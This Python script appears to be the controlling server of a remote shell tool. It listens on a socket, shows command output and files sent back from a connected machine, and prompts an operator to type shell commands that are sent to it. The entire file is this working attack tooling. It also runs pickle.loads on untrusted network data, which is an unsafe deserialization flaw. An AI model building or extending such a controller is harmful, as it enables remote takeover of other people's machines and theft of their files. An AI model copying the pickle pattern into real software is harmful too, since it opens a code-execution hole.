import socket
import pickle

def receive_message(sock):
    message = b''
    # Receive the length of the message (first 10 bytes)
    message_length_data = sock.recv(10)
    message_length_data_int = int(message_length_data.decode('utf-8'))
    print(f'received message length: {message_length_data_int}')
    while message_length_data_int > 0:
        message += sock.recv(1024)
        message_length_data_int -= 1024
    decode_msg = dict(pickle.loads(message))

    return decode_msg  # Convert the received bytes back to a string

def send_message(sock, message):

    message_len = str(len(message)).zfill(10)
    sock.send(message_len.encode('utf-8') + message.encode('utf-8'))
    return 0

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = "localhost"
server_port    = 7878
server_socket.bind((server_address, 7878))
server_socket.listen(1)
print(f"[+] Server listening on port {server_port}...")
    
conn, addr = server_socket.accept()
print(f"[+] Connection established with {addr}")


while True:
    message_inbound = receive_message(conn)
    if message_inbound["data_type"] == 'stdout':
        print(message_inbound["data"])
    elif message_inbound["data_type"] == 'file':
        print('[+]Downloading file')
        with open(f'1{message_inbound["file_name"]}', 'wb') as file:
            print(message_inbound['data'])
            file.write(message_inbound['data'])
            
    send_command = input(f'\033[32m[{message_inbound["whoami"]}] {message_inbound["pwd"]} > \033[0m')
    if send_command:
        send_message(conn, send_command)
    else:
        send_command = 'pwd'
        send_message(conn, send_command)